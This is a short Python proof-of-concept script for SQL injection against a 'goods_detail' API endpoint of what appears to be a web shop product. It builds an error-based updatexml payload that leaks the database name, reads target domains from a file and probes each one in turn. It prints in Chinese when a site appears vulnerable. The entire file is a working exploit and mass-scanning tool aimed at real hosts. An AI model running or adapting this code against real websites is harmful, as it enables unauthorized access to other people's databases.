# -*- coding:utf-8 -*-
import requests
import re
import json
import sys
import urllib3

urllib3.disable_warnings() #忽略https证书告警

vunl_path = "/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)"

def POC(url):
    target_url = url + vunl_path
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",

    }
    try:
        response = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        print("正在测试：", target_url)
        if "syntax" in response.text:
            print("上述地址存在SQL注入")

    except Exception as e:
        print("请求失败！")
        sys.exit(0)

if __name__ == '__main__':
    print("python3 poc.py http://xx.xx.xx.xx")

    with open("./save_file/shiziyuSQL-domainList.txt", "r") as f:
        results = f.readlines()
        for result in results:
            if "http" in result:
                url = result.strip()
                POC(url)
            else:
                url = "http://" + result
                url = url.strip()
                POC(url)